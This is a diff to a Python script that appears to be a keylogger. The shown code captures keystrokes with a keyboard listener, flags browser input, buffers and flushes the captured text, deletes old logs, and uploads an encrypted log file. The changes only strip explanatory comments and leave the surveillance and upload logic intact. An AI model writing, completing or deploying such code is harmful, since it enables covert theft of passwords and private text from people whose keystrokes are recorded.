@@ -54,7 +54,7 @@ class KEYBDINPUT(ctypes.Structure):
         ("wScan", wintypes.WORD),
         ("dwFlags", wintypes.DWORD),
         ("time", wintypes.DWORD),
-        ("dwExtraInfo", ctypes.c_void_p)  # Changed from ULONG_PTR to c_void_p
+        ("dwExtraInfo", ctypes.c_void_p)  
     ]
 
 class INPUT(ctypes.Structure):
@@ -142,7 +142,6 @@ def on_press(key):
         
         handle_keypress(key, is_browser)
         
-        # Auto-flush every 5 seconds or 100 characters
         if time.time() - last_action_time > flush_interval or len(buffer) > 100:
             flush_buffer()
             
@@ -180,7 +179,7 @@ def upload_file(filename):
 
 # Main Execution
 if __name__ == "__main__":
-    # Clean existing logs
+
     if os.path.exists(log_file):
         os.remove(log_file)
     
@@ -188,7 +187,6 @@ if __name__ == "__main__":
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
     
-    # Optional: Upload after encryption
     encrypted_file = f"{log_file}.encrypted"
     if os.path.exists(encrypted_file):
         upload_file(encrypted_file)
